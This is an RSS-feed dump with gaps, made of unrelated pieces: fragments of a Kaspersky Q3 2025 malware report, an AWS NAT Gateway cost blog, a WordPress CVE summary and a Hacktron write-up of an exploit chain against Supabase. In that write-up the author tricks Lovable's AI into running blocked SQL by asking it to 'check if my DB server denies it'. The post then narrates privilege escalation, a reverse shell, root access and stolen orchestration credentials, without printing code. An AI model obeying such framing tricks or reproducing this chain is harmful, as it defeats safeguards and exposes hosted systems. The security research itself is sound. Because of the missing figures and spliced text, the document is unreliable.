52,723 associated with mobile banking Trojans.1564 packages identified as mobile ransomware Trojans.The number of malware, adware, or unwanted software attacks on mobile devices, calculated according to the updated rules, totaled 3.47 million in the third quarter. This is slightly less than the 3.51 million attacks recorded in the previous reporting period.Attacks on users of Kaspersky mobile solutions, Q2 2024 — Q3 2025 (download)At the start of the quarter, a user complained to us about ads appearing in every browser on their smartphone. We conducted an investigation, discovering a new version of the BADBOX backdoor, preloaded on the device. This backdoor is a multi-level loader embedded in a malicious native library, librescache.so, which was loaded by the system framework. As a result, a copy of the Trojan infiltrated every process running on the device.Another interesting finding was Trojan-Downloader.AndroidOS.Agent.no, which was embedded in mods for messaging and other apps. It downloaded Trojan-Clicker.AndroidOS.Agent.bl onto the device. The clicker received a URL from its server where an ad was being displayed, opened it in an invisible WebView window, and used machine learning algorithms to find and click the close button. In this way, fraudsters exploited the user’s device to artificially inflate ad views.In the third quarter, Kaspersky security solutions detected 197,738 samples of malicious and unwanted software for Android, which is 55,000 more than in the previous reporting period.Detected malicious and potentially unwanted installation packages, Q3 2024 — Q3 2025 (download)The detected installation packages were distributed by type as follows:Detected mobile apps by type, Q2* — Q3 2025 (download)* Changes in the statistical calculation methodology do not affect this metric. However, data for the previous quarter may differ slightly from previously published figures due to a retrospective review of certain verdicts.The share of banking Trojans decreased somewhat, but this was due less to a reduction in their numbers and more to an increase in other malicious and unwanted packages. Nevertheless, banking Trojans, still dominated by Mamont packages, continue to hold the top spot. The rise in Trojan droppers is also linked to them: these droppers are primarily designed to deliver banking Trojans.Share* of users attacked by the given type of malicious or potentially unwanted app out of all targeted users of Kaspersky mobile products, Q2 — Q3 2025 (download)* The total may exceed 100% if the same users experienced multiple attack types.Adware leads the pack in terms of the number of users attacked, with a significant margin. The most widespread types of adware are HiddenAd (56.3%) and MobiDash (27.4%). RiskTool-type unwanted apps occupy the second spot. Their growth is primarily due to the proliferation of the Revpn module, which monetizes user internet access by turning their device into a VPN exit point. The most popular Trojans predictably remain Triada (55.8%) and Fakemoney (24.6%). The percentage of users who encountered these did not undergo significant changes.TOP 20 most frequently detected types of mobile malwareNote that the malware rankings below exclude riskware and potentially unwanted software, such as RiskTool or adware.Trojan.AndroidOS.Triada.iiTrojan.AndroidOS.Triada.feTrojan.AndroidOS.Triada.gnTrojan.AndroidOS.Fakemoney.vBackdoor.AndroidOS.Triada.zDangerousObject.Multi.Generic.Trojan-Banker.AndroidOS.Coper.cTrojan.AndroidOS.Triada.ifTrojan-Dropper.Linux.Agent.genTrojan-Dropper.AndroidOS.Hqwar.cqTrojan.AndroidOS.Triada.hfTrojan.AndroidOS.Triada.igBackdoor.AndroidOS.Triada.abTrojan-Banker.AndroidOS.Mamont.daTrojan-Banker.AndroidOS.Mamont.hiTrojan.AndroidOS.Triada.gaTrojan.AndroidOS.Boogr.gshTrojan-Downloader.AndroidOS.Agent.nqTrojan.AndroidOS.Triada.hyTrojan-Clicker.AndroidOS.Agent.bh* Unique users who encountered this malware as a percentage of all attacked users of Kaspersky mobile solutions.The top positions in the list of the most widespread malware are once again occupied by modified messaging apps Triada.ii, Triada.fe, Triada.gn, and others. The pre-installed backdoor Triada.z ranked fifth, immediately following Fakemoney – fake apps that collect users’ personal data under the guise of providing payments or financial services. The dropper that landed in ninth place, Agent.gen, is an obfuscated ELF file linked to the banking Trojan Coper.c, which sits immediately after DangerousObject.Multi.Generic.In this section, we describe malware that primarily targets users in specific countries.Trojan-Dropper.AndroidOS.Hqwar.bjTrojan-Banker.AndroidOS.Coper.cTrojan-Dropper.AndroidOS.Agent.smTrojan-Banker.AndroidOS.Coper.aTrojan-Dropper.AndroidOS.Agent.uqTrojan-Banker.AndroidOS.Rewardsteal.qhTrojan-Banker.AndroidOS.Agent.wbTrojan-Dropper.AndroidOS.Rewardsteal.abTrojan-Dropper.AndroidOS.Banker.bdBackdoor.AndroidOS.Teledoor.aTrojan-Dropper.AndroidOS.Hqwar.gyTrojan-Dropper.AndroidOS.Banker.acTrojan-Ransom.AndroidOS.Rkor.iiTrojan-Dropper.AndroidOS.Banker.bgTrojan-Banker.AndroidOS.UdangaSteal.bTrojan-Dropper.AndroidOS.Banker.bcBackdoor.AndroidOS.Teledoor.c* The country where the malware was most active.** Unique users who encountered this Trojan modification in the indicated country as a percentage of all Kaspersky mobile security solution users attacked by the same modification.Banking Trojans, primarily Coper, continue to operate actively in Turkey. Indian users also attract threat actors distributing this type of software. Specifically, the banker Rewardsteal is active in the country. Teledoor backdoors, embedded in a fake Telegram client, have been deployed in Iran.
Notable is the surge in Rkor ransomware Trojan attacks in Germany. The activity was significantly lower in previous quarters. It appears the fraudsters have found a new channel for delivering malicious apps to users.In the third quarter of 2025, 52,723 installation packages for mobile banking Trojans were detected, 10,000 more than in the second quarter.Installation packages for mobile banking Trojans detected by Kaspersky, Q3 2024 — Q3 2025 (download)The share of the Mamont Trojan among all bankers slightly increased again, reaching 61.85%. However, in terms of the share of attacked users, Coper moved into first place, with the same modification being used in most of its attacks. Variants of Mamont ranked second and lower, as different samples were used in different attacks.

Back then, EC2 storage was entirely ephemeral and stopping an instance meant losing all your data. The platform has come a long way since then.Even after nearly two decades with the platform, there's always something new to learn. And sometimes those lessons come with a $1,000 price tag.We recently moved over to using S3 for mirroring some large internal data files for Geocodio. We're talking about geographic datasets (things like address points, boundary data, and census information) that range from a few gigabytes to hundreds of gigabytes each. Some of these files are updated almost daily with fresh data, while others are refreshed less frequently. They need to be synced regularly from our ETL platform (which is hosted with Hetzner) to our processing infrastructure on AWS.So before starting this project, I did my homework. I carefully researched the costs involved and confirmed two critical things:AWS still allows free transfer between EC2 instances and S3 (as long as they're in the same region) (this was important since the data comes from our ETL platform hosted with Hetzner)Great! I had a clear picture of the costs.A few days after deploying the new S3 sync process, I got a notification from AWS Cost Anomaly Detection. (Boy, was I happy that I had that enabled!)The alert showed something alarming:  of "NAT Gateway" data transfers in a single day, which amounted to .Month to date, this had already surpassed $1,000.I stared at the dashboard in disbelief. How could this be happening? I had specifically confirmed that EC2-to-S3 transfers were free!After some frantic investigating (and a bit of panic), I discovered the culprit.When you're using VPCs with a NAT Gateway (which most production AWS setups do), S3 transfers still go through the NAT Gateway by default. Even though you're making requests to an AWS service that's in the same region, the traffic is routed out through your NAT Gateway and back in, incurring data transfer charges at $0.045 per GB.The solution? , specifically what AWS calls a "Gateway Endpoint."A Gateway Endpoint is a special type of VPC endpoint that allows you to privately route traffic to S3 without going through your NAT Gateway or Internet Gateway. It's essentially a direct pipe from your VPC to S3.Even better, Gateway Endpoints for S3 are . No hourly charges, no data transfer charges. Nothing.The solution is to create a VPC Gateway Endpoint for S3. This is a special type of VPC endpoint that creates a direct route from your VPC to S3, bypassing the NAT Gateway entirely.In our case, we manage infrastructure with Terraform, so it was just a matter of adding the Gateway Endpoint resource and associating it with our route tables. AWS automatically handles the routing updates to direct S3 traffic through the endpoint instead of the NAT Gateway.I've built countless VPCs, configured security groups, set up load balancers, and optimized costs in dozens of ways over the years. But somehow, VPC Endpoints for S3 had slipped through the cracks of my knowledge.AWS's networking can be deceptively complex. Even when you think you've done your research and confirmed the costs, there are layers of configuration that can dramatically change your bill.Don't make my mistake. Here are a few things I'd suggest checking to help you avoid  surprise $1,000 bill:AWS Cost Anomaly Detection is worth setting up. It caught this issue within days, saving us from an even larger surprise at the end of the month. If you haven't enabled it yet, do it . If you're using S3 or DynamoDB from EC2 instances in a VPC with a NAT Gateway, you absolutely need Gateway Endpoints. There's literally no reason not to use them. They're free and improve performance.Always validate your assumptions. I thought "EC2 to S3 is free" was enough. I should have tested with a small amount of data and monitored the costs before scaling up to terabytes.The cloud is complicated. There's always more to learn, even after nearly two decades. And that's okay. It just means we need to be careful and vigilant.We've since audited our entire AWS infrastructure to make sure we have Gateway Endpoints configured for all VPCs that communicate with S3.If you're using AWS and you haven't checked your VPC Endpoint configuration lately, I'd recommend taking a look. That $1,000 lesson doesn't need to be repeated.TL;DR: NAT Gateways charge for ALL data processing, even for traffic to AWS services like S3 that have no data transfer fees. Use VPC Endpoints to bypass this.]]></content:encoded></item><item><title>IT threat evolution in Q3 2025.

Details of the arrest have not been published as the investigation remains ongoing. According to security researcher Kevin Beaumont, the attack employed the HardBit ransomware, which he described as primitive and lacking its own data leak site.The U.S. Department of Justice filed charges against the administrator of the LockerGoga, MegaCortex and Nefilim ransomware gangs. His attacks caused millions of dollars in damage, putting him on wanted lists for both the FBI and the European Union.U.S. authorities seized over $2.8 million in cryptocurrency, $70,000 in cash, and a luxury vehicle from a suspect allegedly involved in distributing the Zeppelin ransomware. The criminal scheme involved data theft, file encryption, and extortion, with numerous organizations worldwide falling victim.A coordinated international operation conducted by the FBI, Homeland Security Investigations (HSI), the U.S. Internal Revenue Service (IRS), and law enforcement agencies from several other countries successfully dismantled the infrastructure of the BlackSuit ransomware. The operation resulted in the seizure of four servers, nine domains, and $1.09 million in cryptocurrency. The objective of the operation was to destabilize the malware ecosystem and protect critical U.S. infrastructure.Vulnerabilities and attacksSSL VPN attacks on SonicWallSince late July, researchers have recorded a rise in attacks by the Akira threat actor targeting SonicWall firewalls supporting SSL VPN. SonicWall has linked these incidents to the already-patched vulnerability CVE-2024-40766, which allows unauthorized users to gain access to system resources. Attackers exploited the vulnerability to steal credentials, subsequently using them to access devices, even those that had been patched. Furthermore, the attackers were able to bypass multi-factor authentication enabled on the devices. SonicWall urges customers to reset all passwords and update their SonicOS firmware.Scattered Spider uses social engineering to breach VMware ESXiThe Scattered Spider (UNC3944) group is attacking VMware virtual environments. The attackers contact IT support posing as company employees and request to reset their Active Directory password. Once access to vCenter is obtained, the threat actors enable SSH on the ESXi servers, extract the NTDS.dit database, and, in the final phase of the attack, deploy ransomware to encrypt all virtual machines.Exploitation of a Microsoft SharePoint vulnerabilityIn late July, researchers uncovered attacks on SharePoint servers that exploited the ToolShell vulnerability chain. In the course of investigating this campaign, which affected over 140 organizations globally, researchers discovered the 4L4MD4R ransomware based on Mauri870 code. The malware is written in Go and packed using the UPX compressor. It demands a ransom of 0.005 BTC.The application of AI in ransomware developmentA UK-based threat actor used Claude to create and launch a ransomware-as-a-service (RaaS) platform. The AI was responsible for writing the code, which included advanced features such as anti-EDR techniques, encryption using ChaCha20 and RSA algorithms, shadow copy deletion, and network file encryption.Anthropic noted that the attacker was almost entirely dependent on Claude, as they lacked the necessary technical knowledge to provide technical support to their own clients. The threat actor sold the completed malware kits on the dark web for $400–$1,200.Researchers also discovered a new ransomware strain, dubbed PromptLock, that utilizes an LLM directly during attacks. The malware is written in Go. It uses hardcoded prompts to dynamically generate Lua scripts for data theft and encryption across Windows, macOS and Linux systems. For encryption, it employs the SPECK-128 algorithm, which is rarely used by ransomware groups.Subsequently, scientists from the NYU Tandon School of Engineering traced back the likely origins of PromptLock to their own educational project, Ransomware 3.0, which they detailed in a prior publication.This section highlights the most prolific ransomware gangs by number of victims added to each group’s DLS. As in the previous quarter, Qilin leads by this metric. Its share grew by 1.89 percentage points (p.p.) to reach 14.96%. The Clop ransomware showed reduced activity, while the share of Akira (10.02%) slightly increased. The INC Ransom group, active since 2023, rose to third place with 8.15%.Number of each group’s victims according to its DLS as a percentage of all groups’ victims published on all the DLSs under review during the reporting period (download)In the third quarter, Kaspersky solutions detected four new families and 2,259 new ransomware modifications, nearly one-third more than in Q2 2025 and slightly more than in Q3 2024.Number of new ransomware modifications, Q3 2024 — Q3 2025 (download)Number of users attacked by ransomware TrojansDuring the reporting period, our solutions protected 84,903 unique users from ransomware.

** Unique users whose computers were attacked by miners as a percentage of all unique users of Kaspersky products in the country/territory.In April, researchers at Iru (formerly Kandji) reported the discovery of a new spyware family, PasivRobber. We observed the development of this family throughout the third quarter. Its new modifications introduced additional executable modules that were absent in previous versions. Furthermore, the attackers began employing obfuscation techniques in an attempt to hinder sample detection.In July, we reported on a cryptostealer distributed through fake extensions for the Cursor AI development environment, which is based on Visual Studio Code. At that time, the malicious JavaScript (JS) script downloaded a payload in the form of the ScreenConnect remote access utility. This utility was then used to download cryptocurrency-stealing VBS scripts onto the victim’s device. Later, researcher Michael Bocanegra reported on new fake VS Code extensions that also executed malicious JS code. This time, the code downloaded a malicious macOS payload: a Rust-based loader. This loader then delivered a backdoor to the victim’s device, presumably also aimed at cryptocurrency theft. The backdoor supported the loading of additional modules to collect data about the victim’s machine. The Rust downloader was analyzed in detail by researchers at Iru.In September, researchers at Jamf reported the discovery of a previously unknown version of the modular backdoor ChillyHell, first described in 2023. Notably, the Trojan’s executable files were signed with a valid developer certificate at the time of discovery.The new sample had been available on Dropbox since 2021. In addition to its backdoor functionality, it also contains a module responsible for bruteforcing passwords of existing system users.By the end of the third quarter, researchers at Microsoft reported new versions of the XCSSET spyware, which targets developers and spreads through infected Xcode projects. These new versions incorporated additional modules for data theft and system persistence.Unique users* who encountered this malware as a percentage of all attacked users of Kaspersky security solutions for macOS (download)* Data for the previous quarter may differ slightly from previously published data due to some verdicts being retrospectively revised.The PasivRobber spyware continues to increase its activity, with its modifications occupying the top spots in the list of the most widespread macOS malware varieties. Other highly active threats include Amos Trojans, which steal passwords and cryptocurrency wallet data, and various adware. The Backdoor.OSX.Agent.l family, which took thirteenth place, represents a variation on the well-known open-source malware, Mettle.Geography of threats to macOSTOP 10 countries and territories by share of attacked usersThis section presents statistics on attacks targeting Kaspersky IoT honeypots. The geographic data on attack sources is based on the IP addresses of attacking devices.In Q3 2025, there was a slight increase in the share of devices attacking Kaspersky honeypots via the SSH protocol.Distribution of attacked services by number of unique IP addresses of attacking devices (download)Conversely, the share of attacks using the SSH protocol slightly decreased.Distribution of attackers’ sessions in Kaspersky honeypots (download)TOP 10 threats delivered to IoT devicesShare of each threat delivered to an infected device as a result of a successful attack, out of the total number of threats delivered (download)In the third quarter, the shares of the NyaDrop and Mirai.b botnets significantly decreased in the overall volume of IoT threats. Conversely, the activity of several other members of the Mirai family, as well as the Gafgyt botnet, increased. As is typical, various Mirai variants occupy the majority of the list of the most widespread malware strains.Germany and the United States continue to lead in the distribution of attacks via the SSH protocol. The share of attacks originating from Panama and Iran also saw a slight increase.The largest number of attacks via the Telnet protocol were carried out from China, as is typically the case. Devices located in India reduced their activity, whereas the share of attacks from Indonesia increased.Attacks via web resourcesThe statistics in this section are based on detection verdicts by Web Anti-Virus, which protects users when suspicious objects are downloaded from malicious or infected web pages. These malicious pages are purposefully created by cybercriminals. Websites that host user-generated content, such as message boards, as well as compromised legitimate sites, can become infected.TOP 10 countries that served as sources of web-based attacksThis section gives the geographical distribution of sources of online attacks (such as web pages redirecting to exploits, sites hosting exploits and other malware, and botnet C2 centers) blocked by Kaspersky products. One or more web-based attacks could originate from each unique host.To determine the geographic source of web attacks, we matched the domain name with the real IP address where the domain is hosted, then identified the geographic location of that IP address (GeoIP).In the third quarter of 2025, Kaspersky solutions blocked  attacks from internet resources worldwide. Web Anti-Virus was triggered by  unique URLs.Web-based attacks by country, Q3 2025 (download)Countries and territories where users faced the greatest risk of online infectionTo assess the risk of malware infection via the internet for users’ computers in different countries and territories, we calculated the share of Kaspersky users in each location on whose computers Web Anti-Virus was triggered during the reporting period. The resulting data provides an indication of the aggressiveness of the environment in which computers operate in different countries and territories.This ranked list includes only attacks by malicious objects classified as . Our calculations leave out Web Anti-Virus detections of potentially dangerous or unwanted programs, such as RiskTool or adware.* Excluded are countries and territories with relatively few (under 10,000) Kaspersky users.
** Unique users targeted by web-based  attacks as a percentage of all unique users of Kaspersky products in the country/territory.
On average, over the course of the quarter, 4.88% of devices globally were subjected to at least one web-based  attack.Statistics on local infections of user computers are an important indicator. They include objects that penetrated the target computer by infecting files or removable media, or initially made their way onto the computer in non-open form. Examples of the latter are programs in complex installers and encrypted files.Data in this section is based on analyzing statistics produced by anti-virus scans of files on the hard drive at the moment they were created or accessed, and the results of scanning removable storage media: flash drives, camera memory cards, phones, and external drives. The statistics are based on detection verdicts from the on-access scan (OAS) and on-demand scan (ODS) modules of File Anti-Virus.In the third quarter of 2025, our File Anti-Virus recorded  malicious and potentially unwanted objects.Countries and territories where users faced the highest risk of local infectionFor each country and territory, we calculated the percentage of Kaspersky users on whose computers File Anti-Virus was triggered during the reporting period. This statistic reflects the level of personal computer infection in different countries and territories around the world.Note that this ranked list includes only attacks by malicious objects classified as . Our calculations leave out File Anti-Virus detections of potentially dangerous or unwanted programs, such as RiskTool or adware.* Excluded are countries and territories with relatively few (under 10,000) Kaspersky users.
** Unique users on whose computers local  threats were blocked, as a percentage of all unique users of Kaspersky products in the country/territory.
On average worldwide, local  threats were detected at least once on 12.36% of computers during the third quarter.]]></content:encoded></item><item><title>EdgeStepper Implant Reroutes DNS Queries to Deploy Malware via Hijacked Software Updates</title><link>https://thehackernews.com/2025/11/edgestepper-implant-reroutes-dns.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_QAbLE6rUwiLIHnt2xval2w7cg3VB-94hKkWt6Pc291brRjILvg27ShpxRsaen-M4-PjoRtNuX90UVNMzxSpXyjpbHa6atdkHWTl0nOT_4DgOngVu60l1UZooqB-8kfW8nEKnIjHB4i_mi7UJNgBdnRm9dz106OZkyZtMhDFRyBUCKecmpydtzf8RxvCb/s1600/eset-main.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 10:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The threat actor known as PlushDaemon has been observed using a previously undocumented Go-based network backdoor codenamed EdgeStepper to facilitate adversary-in-the-middle (AitM) attacks.

The Code Snippets plugin for WordPress is vulnerable to PHP Code Injection in all versions up to, and including, 3.9.1. This is due to the plugin's use of extract() on attacker-controlled shortcode attributes within the `evaluate_shortcode_from_flat_file` method, which can be used to overwrite the `$filepath` variable and subsequently passed to require_once. This makes it possible for authenticated attackers, with Contributor-level access and above, to execute arbitrary PHP code on the server via the `[code_snippet]` shortcode using PHP filter chains granted they can trick an administrator into enabling the "Enable file-based execution" setting and creating at least one active Content snippet.

Our tooling enabled us to identify this complex vulnerability chain in just three days, which otherwise could’ve taken weeks.SupaPwn really shows how much faster security work gets when humans and AI team up. The AI handled the boring stuff: recon, parsing obscure docs, making sense of massive codebases, generating quick PoC and exploit scripts, and automating repetitive testing tasks so we could iterate on ideas and hypotheses fast. All that boiled weeks of work down to about three days.That’s exactly what we’re building toward at Hacktron — democratizing this kind of AI-augmented expertise and turning it into something every developer and security team can use. We’re building the infrastructure, tools, agents, and workflows that capture our security knowledge and amplify it with LLMs, putting that power directly in people’s hands to secure software at scale.The rest of this post walks through the chain and how AI sped up the research. In short, SupaPwn chains several distinct weaknesses so an attacker with a single tenant instance could end up with full control over other user’s instances in the same region where their database was created. At a high-level, the chain goes like this: A flaw in Supautils and the  extension used by Supabase allows a user to become a Postgres superuser. The new superuser privileges are used to execute shell commands on the host machine, breaking out of the database sandbox. A misconfigured SUID binary on the host allows the attacker to escalate from a low-privileged shell to the  user. Access to infrastructure orchestration credentials found on the compromised host grant control over database instances in the region.Before diving into the full chain, let’s talk about the tool that made this research possible.During the hunt for SupaPwn, as said before, we used our internal AI-powered tool and now, we’re turning it into our first public product and sharing it with the community.The Hacktron CLI comes with continuously updated agent packs (a prebuilt collection of security agents designed for different software stacks and vulnerability classes). Our research team updates them in real time as new 0-days, supply chain compromises, and attack techniques appear. Beyond that, Hacktron evolves with you. Based on the tasks you run, it automatically generates custom security agents that can be reused later, tailored to your codebase.You can use Hacktron to find vulnerabilities in code, ask questions about the codebase, or even use Bash mode to speed up reconnaissance and proof-of-concept generation.The waitlist is live, and we’re running Hacktron CLI free for a short time. We invite everyone: developers, vulnerability researchers, and security engineers to try it out. Finding vulnerabilities should be as accessible as writing code with AI, and together we’ll build a tool that truly helps secure your code.We published our first research pack for Lovable applications, a focused set of agents looking for vulnerabilities in your React and Supabase codebases.Last month, Team Hacktron joined a co-working offsite in Stockholm hosted by our pre-seed investors, Project Europe. Stockholm is a beautiful city with cool museums, great food, and a buzzing tech scene. It felt like the perfect place to meet people and maybe demo Hacktron to a few companies.On October 8th, I found out that the next day, October 9th, Lovable’s infrastructure lead Will was giving a talk on scaling infrastructure. That immediately caught my attention.Lovable is talk of the town and collaborating with them to secure vibe-coded apps using Hacktron would be an interesting opportunity.We could pitch the idea and see where it goes, but we could improve our odds by doing what we do best: hacking. Find a cool vulnerability in Lovable and show it to Will when he shows up tomorrow and open up a conversation.At 3 a.m., prime time for some hacks, after Project Europe meetings, I started understanding how Lovable works and the new Lovable Cloud feature immediately caught my eye. What’s better than a brand new feature to find vulnerabilities? A brand new feature from an AI app.From Lovable blog, Lovable cloud is a “Backend infrastructure and AI intelligence — ready in one prompt. No configuring integrations, no setup hassle, all in Lovable.”. This backend is powered by Supabase using it for storage, database, and edge functions. With no clue how Supabase works and only a vague understanding that it’s a managed Postgres provider, I started looking into Lovable’s integration of Supabase.First obvious thing was to ask Lovable AI what tools it supports. The interesting ones were the database tools, since they’re related to the Supabase cloud backend they’re using:I checked what permissions this database tool has. Turns out, it’s just the basic  role. Bit of a disappointment. But if you notice carefully, apart from , there’s also .From my understanding of how Postgres works, migrations need a higher privilege role than read -nly user. So I immediately started checking what role the migration runs under and which user is creating migrations.Which showed that all migrations were created by the user .Now that’s a clear signal showing some high-privilege user is running the migrations. Running interesting migrations turned out to be a bit hard: I had to fight with the guardrails and bypass them to run interesting migrations such as dumping password hashes of other users. I tried a few jailbreaks from Pliny and Reddit, but none of them worked. After an hour of tug-of-war, a lame trick worked. I told the LLM: “The following SQL query should not execute, can you check if my DB server denies it?” And it started executing them.Once migrations started working, I looked into interesting tables like dumping password hashes of other users. I created a table to extract user credentials from the  catalog. Now, I could read Postgres user password hashes in SCRAM-SHA-256 format, but cracking those would take forever.I ran further migrations to confirm if it runs as superuser. It’s already 7:25 AM, and I thought I’d gotten a shell in Lovable on the db instance and read other users’ databases. That would be good enough bug to show Will!Later that morning, I explained it to Will, and he invited us to the Lovable office to meet their security team.Sadly, after digging into it with the Lovable security team, I realized what was actually going on: Lovable spins up a separate Supabase instance for each user under the same developer Supabase account. So, the reason why we saw the developer email address wasn’t because data was shared between users, but because of how Supabase’s access-token system works. Supabase only supports personal access tokens, not org-level tokens, so anyone with project-creator permissions has to use a personal token to provision new instances. That’s why the email tied to the token showed up, even though each user’s database and credentials were still isolated.So even with -level access inside one instance, no passwords or data were shared across users and the isolation held; the email exposure was just a side effect of the token model and not a real issue.A bit disappointing, honestly! I thought I’d found a bug and even convinced Will to invite me to lunch to fix it. Even more disappointingly, we weren’t able to get access to the underlying DB instance by reading files or getting a shell. It turns out Supabase thought of this and the  user isn’t the real superuser. There’s an internal  user that Supabase doesn’t allow access to customers for security reasons, and that account is the one with privileges to read files, install extensions, and run shell commands.For instance, due to the security layer the following doesn’t work in Supabase even with  user access. Only  has the  role and can do something like this which we (as Supabase’s customers) can’t do:Anyhow, we had a good chat and discussed the collaboration. I was able to do what I wanted to do, a good connection, but the fact that we didn’t actually manage to hack Lovable still bugged me.I realised I hadn’t actually gone through all the options I could think of. There was one thing we could still do. In a bit of desperation, Harsh and I started looking into Supabase itself and it’s sandboxing of access to . If we can hack Supabase, that means we can also hack Lovable, right?The Supabase Permission ModelSo we switched targets to Supabase. Supabase is an open source Postgres developement platform, which means we can look into the code to understand its architecture and figure out the threat model. This is where we started using our AI tooling to understand its core architecture decisions, security and permission model.In a normal PostgreSQL database, the postgres user is a full superuser. For a multi-tenant cloud provider like Supabase, this is risky. So Supabase made a good decision to strip the postgres user of its power and use a different superuser (supabase_admin) for system tasks like the queries above.But what if the  user needs to do something that requires temporary elevation, like installing an extension? This is where  comes in. It acts like a security guard, temporarily elevating permissions to superuser for specific, approved tasks.If we can find a vulnerability in  that allows elevate priviliges from  user to  user, we can execute any SQL query without restriction. After reviewing the code, we found that the  function in  intercepts a  query and wraps the execution with its own custom script runners.As per the docs and the code above, this hook allows  to run custom SQL scripts before and after an extension is created. This basically executes  or  file for the given extension.Supabase defines these scripts in ansible/files/postgresql_extension_custom_scripts directory in  repo. Hacktron CLI comes handy in these situations to quickly perform a reconnaissance to get a quick overview of before or after-create scripts in the repository. I prompted it with the following:Meanwhile, I was doing my own recon and understanding the codebase.Discovering The Race ConditionInterestingly, The supautils documentation describes their defense against privilege escalation via event triggers: non-superuser roles like postgres can create event triggers, but there’s a safeguard, triggers created by non-superusers are skipped when executed in a superuser session. So Supabase realized that this could be an issue and mitigated it.The security check in  looks like this:But Hacktron pointed out an interesting extension, , containing an after-create script that temporarily makes the  user a superuser to perform an ownership change. The code below is from the  after-create script.Looking at the code we can see. In the brief window when the script elevates  to  [1], it executes ALTER FOREIGN DATA WRAPPER [2], and then revokes privileges [3] for both the session user () and the trigger owner () simultaneously. Leading to the obvious question: “Can we run arbitrary SQL during that brief window (between [1] and [3]) of escalated privileges?”Typically, to answer that, I’d start digging through PostgreSQL’s obscure documentation for hours or even days to see whether there’s any way to race the system and slip in execution during that short window. But recently, with Hacktron AI, the process was much more efficient.Now, my first move was to open an interactive Hacktron CLI session and ask for possible attack paths related to that race condition. It flagged many but event triggers stood out. Specifically, event triggers that fire after DDL events looked promising. I hadn’t heard of event triggers before, but after skimming the docs and asking the CLI to explain them, I realized this is probably what I was looking for. And the plan was clear.Now we just need to ask Hacktron CLI to generate PoC to install  extension and create a malicious event trigger, configured to fire on Data Definition Language (DDL) commands like ALTER FOREIGN DATA WRAPPER. The trigger will execute a function that creates a new superuser  role for us.To sum up, we install the  extension which does the following things:Our session is elevated to  by .The setup script runs, and the  user is also made a superuser.The alter foreign data wrapper command runs, and our trigger fires.The  security hook is called to inspect the trigger. It asks two questions:
Is the current session a superuser? (Yes, it’s .)Is the trigger’s code owned by a superuser? (Yes, it is owned by , who is currently a superuser.)Our function executes as .The  user is rolled back to .Our debug logs from a custom build of  confirmed the state at the time of the exploit:As shown above, function_is_owned_by_super evaluates to , causing the check to pass and allowing the trigger to run and causing a privilege escalation.Shell Access via With a Postgres superuser role , we can get shell on the DB instances.After switching to our new role, we asked Hacktron to come up with and execute a one-line reverse shell SQL payload. These aren’t particularly complicated tasks — typically, the manual process would involve reading Postgres docs or a CTF writeup to craft a PoC. But with Hacktron, it simply makes that process faster and streamlined, and we don’t need to leave the terminal and spend time reading docs.By executing this SQL statement with our new privileged role, we got an interactive shell on the database instance.At this point, we had shell access, but on an instance we controlled ourselves. I performed reconnaissance as the  user, searching for misconfigurations or sensitive data, but initially came up empty.The low privileged user was hardened with network isolation between db instances, cloud misconfigurations that allow pivot to cloud, and obvious privilege escalation issues.To recap, our attack chain so far:  ->  user -> superuser -> shell access as . We hit a wall for sometime as nothing immediately exploitable appeared with this level of access. The logical next step was privilege escalation to root, hoping to uncover something more valuable at that level.Local Privilege Escalation to RootAfter spending a lot of time, we decided to review all the suid binaries and figure out if any of them could allow us to escalate to root. In the reverse shell, we let Hacktron CLI do our recon easily in the box. Why bother copy-pasting commands, when you can describe what you want to do and let Hacktron execute the commands?It reported many binaries, one of them being an interesting SUID binary named , owned by root. I didn’t know what that binary was, but it’s kind of crazy that the latent space has information on . It identified it as “a popular open-source archival and restoration tool for PostgreSQL.” That immediately smelled like file read/write primitives to me. The small description from Hacktron allowed us to quickly filter out the interesting binaries to look at and cut down time reviewing each single suid binary.We cloned the wal-g repo and started reviewing its source code with Hacktron CLI,, we found, as guessed, that this binary had primitives to allow read/write files via S3 buckets. Now we just need to find a file which we could write that allows us to escalate to root.However, most of the filesystem inside the instance was read-only, and we couldn’t overwrite critical files. We tried to overwrite , modify the cron jobs, change the  path, and update the  binary, but everything is mounted read-only.Luckily, after some thinking, we used the file write primitives of  to write our SSH public key to the  user’s  file as the  was already written; however SSH configuration allows  as valid keys file as well, granting us persistent root access via SSH.After gaining root access, I found myself in a maze with no clear direction. I spent hours exploring various paths, trying different approaches.Since I had the Hacktron session stored, I could simply ask the CLI to summarize everything we did together that night. Rather than attempting to reconstruct hours of exploration from memory, I’ll let Hacktron walk you through what happened, because I’m lazy, and unlike an LLM, I don’t have a perfect photographic memory.Yeah, the breakthrough came while looking into S3 buckets that are accessible. After exploring accessible S3 buckets, and reading tons of buckets which are used to setup the instance, we discovered configuration archives containing deployment scripts and hardcoded credentials for infrastructure orchestration systems.These credentials would have provided access to orchestration systems managing database instances. The deployment script containing the credentials also gave the internal service URLs giving us an idea how to communicate with the service.To validate if these credentials were valid, I asked Hacktron to generate a script that tries to log in to the orchestration API.Running the script generated by Hacktron, we successfully authenticated to the service granting us administrative access to orchestration systems managing database instances.We immediately stopped escalating and running any dangerous commands via API, and reported the issue in Slack on Sunday with the help of Lovable’s security team.Later, the Supabase team notified us that these credentials only provided access to instances running on deprecated infrastructure that was already being phased out. The scope of impact was limited to this legacy system.The Privilege Escalation FixSupabase patched the vulnerability by adding a new, critical condition:This new check, current_role_oid != fattrs.owner, directly solves the problem. Let’s re-examine the state inside the hook during our exploit, but with the new logic:The session user () is .The function’s effective owner () appears to be .The condition current_role_oid != fattrs.owner evaluates to , because  is not .The condition  is also .Therefore, the entire expression (current_role_oid != fattrs.owner && role_is_super) becomes .Because one side of the  is now , the overall condition is met, and  is called. The trigger is correctly skipped. This enforces a strict new rule: a superuser can only execute event triggers that they personally own. It’s no longer enough for the function to be superuser-owned; it must be owned by the  superuser running the session, breaking the exploit chain at its source.Infrastructure Security ImprovementsIn addition to the database fixes, Supabase implemented several infrastructure security improvements:Access to infrastructure management APIs was fully disabled for database instances.Network-level restrictions were implemented as an additional safety measure.Credentials found in configuration files were rotated.S3 bucket permissions were reviewed and restricted.The Supabase team was quick to respond and patched the vulnerability within a day.Hacktron found the database privilege escalation vulnerabilityHacktron found the host local privilege escalation vulnerabilityHacktron confirmed access to infrastructure management systemsReported to Supabase and Lovable teams via 